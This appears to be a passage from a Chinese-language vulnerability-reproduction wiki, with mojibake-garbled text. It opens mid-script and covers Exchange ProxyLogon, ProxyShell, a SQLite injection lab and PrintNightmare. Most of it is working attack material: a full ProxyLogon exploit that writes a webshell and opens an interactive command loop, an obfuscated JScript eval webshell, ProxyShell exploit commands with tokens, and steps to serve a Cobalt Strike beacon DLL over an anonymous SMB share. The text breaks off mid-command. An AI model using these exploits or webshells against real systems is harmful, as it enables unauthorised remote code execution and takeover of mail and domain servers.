__name__==&quot;__main__&quot;: parser = argparse.ArgumentParser( description=&#x27;Example: python exp.py -u 127.0.0.1 -user administrator -suffix @ex.com å¦‚æœä¸æ¸…æ¥šç”¨æˆ·åï¼Œå¯ä¸å¡«å†™-userå‚æ•°ï¼Œå°†è‡ªåŠ¨Fuzzç”¨æˆ·åã€‚&#x27;) parser.add_argument(&#x27;-u&#x27;, type=str, help=&#x27;target&#x27;) parser.add_argument(&#x27;-user&#x27;, help=&#x27;exist email&#x27;, default=&#x27;&#x27;) parser.add_argument(&#x27;-suffix&#x27;, help=&#x27;email suffix&#x27;) args = parser.parse_args() target = args.u suffix = args.suffix if suffix == &quot;&quot;: print(&quot;è¯·è¾“å…¥suffix&quot;) exist_email = args.user if exist_email: fuzz_email.insert(0, exist_email) random_name = id_generator(4) + &quot;.js&quot; print(&quot;ç›®æ ‡ Exchange Server: &quot; + target) for i in fuzz_email: new_email = i+suffix autoDiscoverBody = &quot;&quot;&quot;&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt; &lt;Request&gt; &lt;EMailAddress&gt;%s&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt; &lt;/Request&gt;&lt;/Autodiscover&gt;&quot;&quot;&quot; % new_email # print(&quot;get FQDN&quot;) FQDN = &quot;EXCHANGE01&quot; ct = requests.get(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123;&quot;Cookie&quot;: &quot;X-BEResource=localhost~1942062522&quot;, &quot;User-Agent&quot;: user_agent&#125;, verify=False, proxies=proxies) if &quot;X-CalculatedBETarget&quot; in ct.headers and &quot;X-FEServer&quot; in ct.headers: FQDN = ct.headers[&quot;X-FEServer&quot;] print(&quot;got FQDN:&quot; + FQDN) ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; &quot;Cookie&quot;: &quot;X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;&quot; % FQDN, &quot;Content-Type&quot;: &quot;text/xml&quot;, &quot;User-Agent&quot;: user_agent&#125;, data=autoDiscoverBody, proxies=proxies, verify=False ) if ct.status_code != 200: print(ct.status_code) print(&quot;Autodiscover Error!&quot;) if &quot;&lt;LegacyDN&gt;&quot; not in str(ct.content): print(&quot;Can not get LegacyDN!&quot;) try: legacyDn = str(ct.content).split(&quot;&lt;LegacyDN&gt;&quot;)[ 1].split(r&quot;&lt;/LegacyDN&gt;&quot;)[0] print(&quot;Got DN: &quot; + legacyDn) mapi_body = legacyDn + \\ &quot;\\x00\\x00\\x00\\x00\\x00\\xe4\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x00\\x00\\x00\\x00&quot; ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&amp;a=~1942062522;&quot; % FQDN, &quot;Content-Type&quot;: &quot;application/mapi-http&quot;, &quot;X-Requesttype&quot;: &quot;Connect&quot;, &quot;X-Clientinfo&quot;: &quot;&#123;2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226&#125;&quot;, &quot;X-Clientapplication&quot;: &quot;Outlook/15.0.4815.1002&quot;, &quot;X-Requestid&quot;: &quot;&#123;E2EA6C1C-E61B-49E9-9CFB-38184F907552&#125;:123456&quot;, &quot;User-Agent&quot;: user_agent &#125;, data=mapi_body, verify=False, proxies=proxies ) if ct.status_code != 200 or &quot;act as owner of a UserMailbox&quot; not in str(ct.content): print(&quot;Mapi Error!&quot;) exit() sid = str(ct.content).split(&quot;with SID &quot;)[ 1].split(&quot; and MasterAccountSid&quot;)[0] print(&quot;Got SID: &quot; + sid) sid = sid.replace(sid.split(&quot;-&quot;)[-1], &quot;500&quot;) proxyLogon_request = &quot;&quot;&quot;&lt;r at=&quot;Negotiate&quot; ln=&quot;john&quot;&gt;&lt;s&gt;%s&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-1-0&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-2&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-11&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-15&lt;/s&gt;&lt;s a=&quot;3221225479&quot; t=&quot;1&quot;&gt;S-1-5-5-0-6948923&lt;/s&gt;&lt;/r&gt; &quot;&quot;&quot; % sid ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;&quot; % FQDN, &quot;Content-Type&quot;: &quot;text/xml&quot;, &quot;msExchLogonMailbox&quot;: &quot;S-1-5-20&quot;, &quot;User-Agent&quot;: user_agent &#125;, data=proxyLogon_request, proxies=proxies, verify=False ) if ct.status_code != 241 or not &quot;set-cookie&quot; in ct.headers: print(&quot;Proxylogon Error!&quot;) exit() sess_id = ct.headers[&#x27;set-cookie&#x27;].split( &quot;ASP.NET_SessionId=&quot;)[1].split(&quot;;&quot;)[0] msExchEcpCanary = ct.headers[&#x27;set-cookie&#x27;].split(&quot;msExchEcpCanary=&quot;)[ 1].split(&quot;;&quot;)[0] print(&quot;Got session id: &quot; + sess_id) print(&quot;Got canary: &quot; + msExchEcpCanary) ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; # &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot; % ( # FQDN, msExchEcpCanary, sess_id, msExchEcpCanary), &quot;Cookie&quot;: &quot;X-BEResource=Admin@&#123;server_name&#125;:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&amp;schema=VirtualDirectory&amp;msExchEcpCanary=&#123;msExchEcpCanary&#125;&amp;a=~1942062522; ASP.NET_SessionId=&#123;sess_id&#125;; msExchEcpCanary=&#123;msExchEcpCanary1&#125;&quot;. format(server_name=FQDN, msExchEcpCanary1=msExchEcpCanary, sess_id=sess_id, msExchEcpCanary=msExchEcpCanary), &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;, &quot;msExchLogonMailbox&quot;: &quot;S-1-5-20&quot;, &quot;User-Agent&quot;: user_agent &#125;, json=&#123;&quot;filter&quot;: &#123; &quot;Parameters&quot;: &#123;&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;SelectedView&quot;: &quot;&quot;, &quot;SelectedVDirType&quot;: &quot;OAB&quot;&#125;&#125;, &quot;sort&quot;: &#123;&#125;&#125;, verify=False, proxies=proxies ) if ct.status_code != 200: print(&quot;GetOAB Error!&quot;) exit() oabId = str(ct.content).split(&#x27;&quot;RawIdentity&quot;:&quot;&#x27;)[1].split(&#x27;&quot;&#x27;)[0] print(&quot;Got OAB id: &quot; + oabId) oab_json = &#123;&quot;identity&quot;: &#123;&quot;__type&quot;: &quot;Identity:ECP&quot;, &quot;DisplayName&quot;: &quot;OAB (Default Web Site)&quot;, &quot;RawIdentity&quot;: oabId&#125;, &quot;properties&quot;: &#123; &quot;Parameters&quot;: &#123;&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;ExternalUrl&quot;: &quot;http://ffff/#%s&quot; % shell_content&#125;&#125;&#125; ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot; % ( FQDN, msExchEcpCanary, sess_id, msExchEcpCanary), &quot;msExchLogonMailbox&quot;: &quot;S-1-5-20&quot;, &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;, &quot;User-Agent&quot;: user_agent &#125;, json=oab_json, proxies=proxies, verify=False ) if ct.status_code != 200: print(&quot;Set external url Error!&quot;) exit() reset_oab_body = &#123;&quot;identity&quot;: &#123;&quot;__type&quot;: &quot;Identity:ECP&quot;, &quot;DisplayName&quot;: &quot;OAB (Default Web Site)&quot;, &quot;RawIdentity&quot;: oabId&#125;, &quot;properties&quot;: &#123; &quot;Parameters&quot;: &#123;&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;FilePathName&quot;: shell_absolute_path&#125;&#125;&#125; ct = requests.post(&quot;https://%s/ecp/%s&quot; % (target, random_name), headers=&#123; &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot; % ( FQDN, msExchEcpCanary, sess_id, msExchEcpCanary), &quot;msExchLogonMailbox&quot;: &quot;S-1-5-20&quot;, &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;, &quot;User-Agent&quot;: user_agent &#125;, json=reset_oab_body, proxies=proxies, verify=False ) if ct.status_code != 200: print(&quot;å†™å…¥shellå¤±è´¥&quot;) exit() shell_url = &quot;https://&quot;+target+&quot;/owa/auth/test11.aspx&quot; print(&quot;æˆåŠŸå†™å…¥shellï¼š&quot; + shell_url) print(&quot;ä¸‹é¢éªŒè¯shellæ˜¯å¦ok&quot;) print(&#x27;code=Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;whoami&quot;).StdOut.ReadAll());&#x27;) print(&quot;æ­£åœ¨è¯·æ±‚shell&quot;) import time time.sleep(1) data = requests.post(shell_url, data=&#123; &quot;code&quot;: &quot;Response.Write(new ActiveXObject(\\&quot;WScript.Shell\\&quot;).exec(\\&quot;whoami\\&quot;).StdOut.ReadAll());&quot;&#125;, verify=False, proxies=proxies) if data.status_code != 200: print(&quot;å†™å…¥shellå¤±è´¥&quot;) else: print(&quot;shell:&quot;+data.text.split(&quot;OAB (Default Web Site)&quot;) [0].replace(&quot;Name : &quot;, &quot;&quot;)) print(&#x27;[+]ç”¨æˆ·å: &#x27;+ new_email) final_shell = shell_url break except: print(&#x27;[-]ç”¨æˆ·å: &#x27;+new_email) print(&quot;=============================&quot;) if not final_shell: sys.exit() print(&quot;ä¸‹é¢å¯ç”¨äº¤äº’å¼shell&quot;) while True: input_cmd = input(&quot;[#] command: &quot;) data=&#123;&quot;code&quot;: &quot;&quot;&quot;Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;cmd /c %s&quot;).stdout.readall())&quot;&quot;&quot; % input_cmd&#125; ct = requests.post( final_shell, data=data,verify=False, proxies=proxies) if ct.status_code != 200 or &quot;OAB (Default Web Site)&quot; not in ct.text: print(&quot;[*] Failed to execute shell command&quot;) else: shell_response = ct.text.split( &quot;Name :&quot;)[0] print(shell_response) æ‰§è¡Œexp expå‘½ä»¤æ ¼å¼123python exp.py -u &lt;é¶æœºip&gt; -user &lt;ç”¨æˆ·&gt; -suffix @&lt;FQDN&gt;//suffixï¼šå‰ç¼€çš„æ„æ€ 1python exp.py -u 192.168.147.141 -user administrator -suffix @exchange.local å‡ºé”™æ’æŸ¥ å®‰è£…å®Œï¼Œè‡³å°‘éœ€è¦åŸŸ/administratorç”¨æˆ·ç™»å½•è¿‡https://127.0.0.1/ecp/ ï¼Œå¦åˆ™æ‰§è¡Œexpä¼šè¿™æ ·ï¼š åœ¨Exchange2019cu9ä¸Šæ‰§è¡Œexpï¼ˆä¼°è®¡å·²ä¿®å¤ï¼‰ å‚è€ƒé“¾æ¥ å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ Exchange CVE-2021-26855 RCEæ¼æ´å¤ç° æŒ‰è¿™ä¸ªæ–‡ç« èµ°å³å¯"},{"title":"SQLite","path":"/wiki/sql_injection_env/SQLite.html","content":"æ ‡é¢˜ é“¾æ¥ å¤‡æ³¨ sqlite-labï¼Œgithubé¡¹ç›® https://github.com/incredibleindishell/sqlite-lab sqlite-labéƒ¨ç½²æºç  ä¸‹è½½æ‹–è¿›phpstudyçš„WWWç›®å½•ä¸‹ æ‰“å¼€phpæ‹“å±•ä¸­çš„php_sqlite3 å…¶ä»– å¯èƒ½è¦ç”¨åˆ°çš„è½¯ä»¶å‚è€ƒï¼šhttps://github.com/Tomassky/Web--Training"},{"title":"Exchange ProxyShell","path":"/wiki/vuln_reproduction/Exchange_ProxyShell.html","content":"æ¼æ´ä¿¡æ¯ åç§°/ç¼–å· å½±å“èŒƒå›´ å·²å¤ç°ç‰ˆæœ¬ æµ‹ä¸é€šçš„ç‰ˆæœ¬ ProxyShell Exchange Server 2010Exchange Server 2013Exchange Server 2016Exchange Server 2019 Exchange 2016 cu18Exchange 2019 cu9(?) 3ä¸ªCVEç»„åˆæˆçš„RCEï¼š CVE-2021-34473 Microsoft Exchange ACLç»•è¿‡æ¼æ´ CVE-2021-34523 Microsoft Exchangeæƒé™æå‡æ¼æ´ CVE-2021-31207 Microsoft Exchangeæˆæƒä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ æ¼æ´å¤ç° ç¯å¢ƒæ‹“æ‰‘ è™šæ‹Ÿæœº ip æ‰€åœ¨åŸŸ Exchange2016cu18 192.168.147.141 exchange.local è¿™ä¸ªé¶æœºç¯å¢ƒæ˜¯ä½¿ç”¨server2016æ­å»ºDCï¼Œç„¶ååœ¨è¯¥DCä¸Šå®‰è£…Exchange2016ï¼Œæ‰€åœ¨åŸŸæ˜¯exchange.local è™šæ‹Ÿæœº ip æ‰€åœ¨åŸŸ Exchange 2019 cu9 192.168.147.151 exchange2019.local è¿™ä¸ªé¶æœºç¯å¢ƒæ˜¯ä½¿ç”¨server2019æ­å»ºDCï¼Œç„¶ååœ¨è¯¥DCä¸Šå®‰è£…Exchange2019ï¼Œæ‰€åœ¨åŸŸæ˜¯exchange2019.local è£…æœ‰python3çš„æ”»å‡»æœºä¸€å° é¶æœºç¯å¢ƒè¦æ±‚ expæ‰§è¡Œæ—¶å‚æ•°çš„ç”¨æˆ·è¦æ˜¯Mailbox Import Exportè§’è‰²ï¼Œå¯ä»¥é€šè¿‡Exchangeç®¡ç†ä¸­å¿ƒï¼ˆEACï¼‰æˆ–é€šè¿‡Exchangeç®¡ç†Shellæ¥æ·»åŠ ï¼š 1New-ManagementRoleAssignment -Role &quot;Mailbox Import Export&quot; -User &quot;your user&quot; ä¾‹1New-ManagementRoleAssignment â€“Role &quot;Mailbox Import Export&quot; â€“User &quot;Administrator&quot; github_proxyshell-poc_issue#4 webshellå‡†å¤‡ ä½¿ç”¨proxyshell_payloadå¯¹webshellè¿›è¡ŒEncode å‡è®¾æƒ³ä½¿ç”¨è¿™æ®µwebshell1&#x27;&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var NNVF=\\&#x27;dFUwlmztVCSLYeHkDMgEZrKWhjQBNsuiGnf0xJPqAcvbIopXyaTR\\&#x27;;var NURV=Request.Form(&quot;mima&quot;);var FASZ=NNVF(2) + NNVF(28) + NNVF(10) + NNVF(40) + NNVF(1) + NNVF(13);eval(NURV, FASZ);%&gt;&#x27; å°†ä¸Šé¢è¿™æ®µwebshellèµ‹å€¼ç»™proxyshell_payload.pyä¸­mainå‡½æ•°çš„webshellå˜é‡ä¹‹é—´ï¼Œæ›¿æ¢åå¦‚ä¸‹ï¼š 123456#æºç å…¶ä»–éƒ¨åˆ†ç•¥if __name__ == &quot;__main__&quot;: webshell = b&#x27;&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var NNVF=\\&#x27;dFUwlmztVCSLYeHkDMgEZrKWhjQBNsuiGnf0xJPqAcvbIopXyaTR\\&#x27;;var NURV=Request.Form(&quot;mima&quot;);var FASZ=NNVF(2) + NNVF(28) + NNVF(10) + NNVF(40) + NNVF(1) + NNVF(13);eval(NURV, FASZ);%&gt;&#x27; #...#æºç å…¶ä»–éƒ¨åˆ†ç•¥ æ‰§è¡Œè„šæœ¬è¿›è¡ŒEncode 1python proxyshell_payload.py å°†Encode webshelléƒ¨åˆ†çš„å†…å®¹å¤åˆ¶ï¼Œæ”¾åˆ°proxyshell_rce.py314è¡Œçš„&lt;t:Content&gt;å…ƒç´ ä¹‹é—´ å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚ä¿®æ”¹ç”Ÿæˆshellçš„è·¯å¾„ï¼Œä¿®æ”¹Proxyshell_rce.pyä¸­è¿™ä¸¤è¡Œå†…å®¹ï¼Œå°†å…¶å¯¹åº” å¯¹webshellç¼–ç çš„åŸå› ProxyShellçš„å¤ç°ä¸åˆ†æWebshell-Attack Exchange PowerShellæœ€åä¸€éƒ¨åˆ†å°±æ˜¯åœ¨è·å–äº†exchangeçš„ç®¡ç†powershellæ¥å£ä¹‹åï¼Œå¦‚ä½•è·å–webshellï¼šè¿™é‡Œä½¿ç”¨çš„æ˜¯é‚®ä»¶å¯¼å‡ºè¯·æ±‚New-MailboxExportRequestï¼š12New-MailboxExportRequest â€“Mailbox orange@orange.local â€“FilePath\\\\127.0.0.1\\C$\\path\\to\\shell.aspxä½†æ˜¯é»˜è®¤å¯¼å‡ºçš„æ ¼å¼æ˜¯pstï¼Œå¹¶ä¸”pstæ ¼å¼ä¼šå¯¹å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œç›´æ¥åœ¨é‚®ä»¶ä¸­å†™å…¥webshellå¹¶ä¸ä¼šç”Ÿæ•ˆã€‚orangeäºæ˜¯å¯¹pstæ ¼å¼è¿›è¡Œäº†ç ”ç©¶ï¼Œå»é˜…è¯»äº† MS-PSTçš„æ–‡æ¡£ï¼Œå‘ç°å…¶ä½¿ç”¨çš„åŠ å¯†ä¸ºç±»ä¼¼å¼‚æˆ–åŠ å¯†æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è¯´åŠ å¯†åœ¨åŠ å¯†å°±å˜æˆäº†æ˜æ–‡ï¼Œé‚£ä¹ˆåªè¦å…ˆä½¿ç”¨å…¶åŠ å¯†æ–¹æ³•åŠ å¯†ä¸€éæˆ‘ä»¬è¦å†™å…¥çš„webshellï¼Œå°±å¯ä»¥åœ¨å¯¼å‡ºæ—¶ï¼Œè·å¾—æ˜æ–‡ï¼Œä»è€Œè·å–webshellã€‚æ‰€ä»¥è¦ç”¨proxyshell_payload.pyå…ˆå¯¹webshellè¿›è¡Œç¼–ç ç„¶åæ”¾åˆ°expçš„é™„ä»¶ä¸­ æ¼æ´åˆ©ç”¨ expè¯­æ³•æ ¼å¼1python proxyshell_rce.py -u https://x.x.x.x/ -e administrator@xxx.comï¼ˆæœ€åè¿™ä¸ªé‚®ç®±å¿…é¡»ä¸ºç›®æ ‡é‚®ç®±ç®¡ç†ç»„çš„é‚®ç®±ç”¨æˆ·åï¼Œä¸€èˆ¬administratoréƒ½åœ¨ï¼‰ Exchange2016æ¼æ´åˆ©ç”¨1python proxyshell_rce.py -u https://192.168.147.141/ -e administrator@exchange.local æ‰§è¡Œexpåï¼Œè·å–åˆ°çš„æ˜¯exchangeçš„powershellç®¡ç†shellï¼Œç„¶åæ¸…ç†é‚®ä»¶å¯¼å‡ºè¯·æ±‚ï¼Œä¹‹åæ‰§è¡Œdropshellï¼Œå³å¯å†™å…¥webshell 12Get-MailboxExportRequestGet-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false dropshellå†™webshell 1dropshell åœ¨C:\\inetpub\\wwwroot\\aspnet_clientä¸‹çœ‹åˆ°å†™çš„webshell æˆåŠŸåä½¿ç”¨èšå‰‘è¿æ¥webshellï¼Œè¿æ¥åœ°å€ä¸ºç»ˆç«¯å›æ˜¾çš„webshell-urlåœ°å€ï¼Œå¯†ç ä¸ºmimaï¼Œå‹¾é€‰å¿½ç•¥HTTPSè¯ä¹¦ è¿æ¥æˆåŠŸï¼Œç»ˆç«¯å›æ˜¾æƒé™ä¸ºsystem troubleshooting é¶æœºæ³¨æ„å…³é—­æ€è½¯ï¼Œè¦ä¸å†™shellå¯èƒ½è¢«æ€ Exchange2019å¤ç°é—®é¢˜ Exchange2019æ¼æ´åˆ©ç”¨1python proxyshell_rce.py -u https://192.168.147.151/ -e Administrator@exchange2019.local åˆ°dropshellæ­¥éª¤å‰éƒ½æ­£å¸¸ ç„¶åæ‰§è¡Œdropshellæœ‰æ¦‚ç‡failedï¼Œä¸æ¸…æ¥šåŸå› ã€‚ä½†å¦‚æœå…ˆç”¨è¿™ç‰ˆçš„proxyshellå·¥å…·å…ˆdropshellï¼ˆèƒ½å†™å…¥webshellï¼Œä¿ºå°†ä¸Šè¾¹webshellçš„Encodeæ”¾å…¥t.Conentä¹‹é—´ï¼Œå†™webshellï¼Œä½†æ˜¯èšå‰‘è¿æ¥æç¤ºæ•°æ®ä¸ºç©ºï¼‰ï¼Œåé¢ç”¨proxyshell_rce.pyå°±ç™¾åˆ†ç™¾èƒ½å†™webshellã€‚ ä¾èµ–1pip install tldextract 123python exchange_proxyshell_raw.py -u https://192.168.147.151dropshell åˆ©ç”¨æ­¥éª¤å­¦ä¹  å‚è€ƒè¿™ç¯‡æ–‡ç« Exchange ProxyShellå¤ç°_exchange shell-CSDNåšå®¢ï¼Œè¿œç¨‹å†™webshellæ˜¯é€šè¿‡å‘é‚®ä»¶ï¼Œwebshellåœ¨é™„ä»¶ä¸­ï¼Œç„¶åè§£å‹åˆ°æœ¬åœ°ã€‚ å‚è€ƒé“¾æ¥ å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ Exchange CVE-2021-34473 RCEå¤ç° å¤ç°å‚è€ƒæ–‡ç« ä¹‹ä¸€ ProxyShellçš„å¤ç°ä¸åˆ†æ å¤ç°å‚è€ƒæ–‡ç« ä¹‹ä¸€ Exchange CVE-2021-34473 å¤ç°å‚è€ƒæ–‡ç« ä¹‹ä¸€ï¼Œå¾ˆè¯¦ç»†ï¼Œwebshellç°æˆå¯ç”¨ proxyshell_payload å¯¹webshell EncodeæˆProxyShellçš„payload proxyshell-poc expåˆ©ç”¨ å…¶ä»–ç‰ˆçš„ProxyShell å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ CVE-2021-34473-Exchange-ProxyShell æ­¥éª¤æ‹†åˆ†ç‰ˆ æ­¥éª¤æ‹†åˆ†ç‰ˆï¼š token å‘é‚®ä»¶ getshell 2019è¯•äº†getshellä¸è¡Œ å‘½ä»¤è®°å½•1234567891011121314152016ï¼š å•ä¸ªè·å–tokenpython send_webshell_mail.py https://192.168.147.141 administrator@exchange.local (åªå‘é€webshell è‰ç¨¿é‚®ä»¶)python send_webshell_mail.py https://192.168.147.141 administrator@exchange.local sendpython wsman_shell.py https://192.168.147.141 administrator@exchange.local VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBxhZG1pbmlzdHJhdG9yQGV4Y2hhbmdlLmxvY2FsVS1TLTEtNS0yMS0yODA0NDc5NzgxLTM3MzM1MzQ0MDktMjQ0NjY5OTQwNC01MDBHAQAAAAcAAAAMUy0xLTUtMzItNTQ0RQAAAAA= shell2019ï¼š å•ä¸ªè·å–tokenpython send_webshell_mail.py https://192.168.147.151 Administrator@exchange2019.local (åªå‘é€webshell è‰ç¨¿é‚®ä»¶)python send_webshell_mail.py https://192.168.147.151 Administrator@exchange2019.local sendpython wsman_shell.py https://192.168.147.141 administrator@exchange.local VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTCBBZG1pbmlzdHJhdG9yQGV4Y2hhbmdlMjAxOS5sb2NhbFUrUy0xLTUtMjEtNzkzNTEwODE1LTcxOTY4NTQxMC0zNDU1NTgzNjg3LTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA== shell å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ ProxyShell ä¸€é”®åˆ©ç”¨ç‰ˆ https://codeantenna.com/a/JMadcrhX0j å‚è€ƒæ–‡ç«  Exchange ProxyShellå¤ç°_exchange shell-CSDNåšå®¢ å‚è€ƒæ–‡ç«  ProxyShell ä¸Šä¸€ç¯‡åšå®¢åšä¸»æ‰“åŒ…çš„å·¥å…· 2016æœ‰æ—¶ok,whoamiå›æ˜¾sysytemï¼Œ2019å¤±è´¥ï¼š"},{"title":"PrintNightmare CVE-2021-1675/CVE-2021-34527","path":"/wiki/vuln_reproduction/PrintNightmare.html","content":"æ¼æ´ä¿¡æ¯ åç§°/ç¼–å· å½±å“èŒƒå›´ å·²å¤ç°ç‰ˆæœ¬ æµ‹ä¸é€šçš„ç‰ˆæœ¬ PrintNightmare Windows 7Windows 8.1Windows 10Windows Server 2008 R2Windows Server 2012Windows Server 2016Windows Server 2019 server2019ä½œä¸ºDCåŸŸé‡Œç”¨æˆ·win7ï¼Œserver2016ï¼Œwin10å‡å¤ç° server2012ä½œä¸ºDCèƒ½å¤ç°åŠ è½½æœ¬åœ°çš„dllï¼ŒSMBä¼šrpc_s_access_denied ä¸¤ä¸ªç›¸ä¼¼çš„æ´ï¼Œä½†å¾®è½¯æŠ«éœ²çš„æ¼æ´ä¿¡æ¯çš„vectorï¼ˆå‘é‡ï¼‰ä¸ä¸€æ ·ï¼Œä¸€ä¸ªlpeï¼Œä¸€ä¸ªæ˜¯rceã€‚æœ¬æ–‡å¤ç°çš„æ˜¯rceï¼Œexpè„šæœ¬æ˜¯ä½œè€…å†™ä¸ºäº†CVE 2021-1675 CVE-2021-1675ï¼šLPE CVE-2021-34527ï¼šRCE æ¼æ´å¤ç° ç¯å¢ƒæ‹“æ‰‘ è™šæ‹Ÿæœº ip ç‰ˆæœ¬ å¤‡æ³¨ åŸŸæ§DCï¼Œserver2019 192.168.147.137 Version 1809(Os Build 17763.107) server2012å½“DCï¼Œexpæ‰“DCæˆ–è¿™ä¸ªåŸŸä¸­å…¶ä»–æˆå‘˜éƒ½æŠ¥rpc access deniedã€‚å…·ä½“åŸå› æœªçŸ¥ åŸŸæˆå‘˜server2016 192.168.147.138 ç‰ˆæœ¬1607(OSå†…éƒ¨ç‰ˆæœ¬14393.447) åŸŸæˆå‘˜win10 192.168.147.140 ç‰ˆæœ¬1909 (oSå†…éƒ¨ç‰ˆæœ¬18363.418) åŸŸæˆå‘˜win7 192.168.147.139 Version 6.1(Build 7601: Service Pack 1) æ”»å‡»æœºkali 192.168.147.128 æ¼æ´æ£€æµ‹ ä½œè€…çš„exp(CVE-2021-1675)ä¾èµ–äºä½œè€…ä¿®æ”¹è¿‡çš„impacketï¼Œå› æ­¤éœ€è¦å…ˆå®‰è£…ä½œè€…ä¿®æ”¹è¿‡çš„impacketã€‚ 1234pip3 uninstall impacketgit clone https://github.com/cube0x0/impacketcd impacketpython3 ./setup.py install impacket/exampleé‡Œçš„rpcdump.pyå¯ç”¨äºæ£€æµ‹potential vulnerable hostsã€‚ 1python3 rpcdump.py @192.168.147.136 | egrep &#x27;MS-RPRN|MS-PAR&#x27; å¦‚æœå›æ˜¾å¦‚ä¸‹ï¼Œè¯´æ˜ç›®æ ‡æ˜¯vulnerable 12Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol åˆ›å»ºåŒ¿åSMBå…±äº« å‡†å¤‡ä¸€ä¸ªmalicious dllï¼Œå› ä¸ºspoolsv.exeæ˜¯x64çš„ï¼Œæ‰€ä»¥è¿™ä¸ªdllä¹Ÿè¦æ˜¯x64çš„ã€‚åœ¨æœ¬ä¾‹ä¸­æ˜¯csç”Ÿæˆçš„windows stageless x64dllï¼Œåä¸ºbeacon.dll åŒ¿åSMBå…±äº«å¯ä»¥æ˜¯windowsæˆ–Linuxä¸»æœºæ¥èµ· WindowsLinuxå¦‚åœ¨åŸŸæˆå‘˜server2016ä¸»æœºä¸­ ç®¡ç†å‘˜cmd 1mkdir C:\\share å°†beacon.dllæ”¾å…¥C:\\shareæ–‡ä»¶å¤¹ä¸­ï¼Œå†ç»§ç»­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ âš ï¼šä¸€å®šè¦å…ˆå°†dllæ”¾å…¥åå†æ‰§è¡Œåç»­å‘½ä»¤ã€‚ å¦‚æœå…ˆå°†å…¨éƒ¨å‘½ä»¤æ‰§è¡Œå®Œï¼Œå†æ”¾å…¥æ–‡ä»¶ï¼Œå³ä¾¿é¶æœºcmdè®¿é—® 1\\\\&lt;ip&gt; å¹¶ä¸”èƒ½æ‰“å¼€shareæ–‡ä»¶å¤¹ï¼Œçœ‹åˆ°beacon.dllï¼Œä½†æœ€åæ‰§è¡Œexpè¿˜æ˜¯ä¼šæŠ¥rpc access deniedï¼Œexpåˆ©ç”¨å¤±è´¥ 1234567icacls C:\\share\\ /T /grant &quot;Anonymous logon&quot;:ricacls C:\\share\\ /T /grant Everyone:rpowershell.exe New-SmbShare -Path C:\\share -Name share -ReadAccess &#x27;ANONYMOUS LOGON&#x27;,&#x27;Everyone&#x27;REG ADD &quot;HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters&quot; /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipesREG ADD &quot;HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters&quot; /v NullSessionShares /t REG_MULTI_SZ /d share /fREG ADD 